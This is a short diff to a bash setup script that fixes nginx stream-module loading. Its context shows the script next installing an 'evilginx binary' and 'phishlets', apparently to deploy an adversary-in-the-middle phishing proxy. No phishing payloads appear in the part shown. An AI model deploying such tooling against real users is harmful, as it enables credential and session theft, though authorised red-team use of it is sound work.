@@ -58,9 +58,13 @@ export DEBIAN_FRONTEND=noninteractive
 apt-get update -y
 apt-get install -y python3 python3-venv nginx iproute2 curl ca-certificates build-essential
 apt-get install -y libnginx-mod-stream || true
-# Stream is compiled into nginx binary — remove dynamic module loader to avoid duplicate
+# Remove package conf that causes duplicate load — we inject our own
 rm -f /etc/nginx/modules-enabled/50-mod-stream.conf
 sed -i '/load_module.*ngx_stream_module/d' /etc/nginx/nginx.conf
+# Add load_module once at top (needed for dynamic module)
+if [[ -f /usr/lib/nginx/modules/ngx_stream_module.so ]]; then
+    sed -i '1i load_module modules/ngx_stream_module.so;' /etc/nginx/nginx.conf
+fi
 
 echo "==> Step 2/6  evilginx binary + phishlets"
 mkdir -p "$EVG_DIST/phishlets"
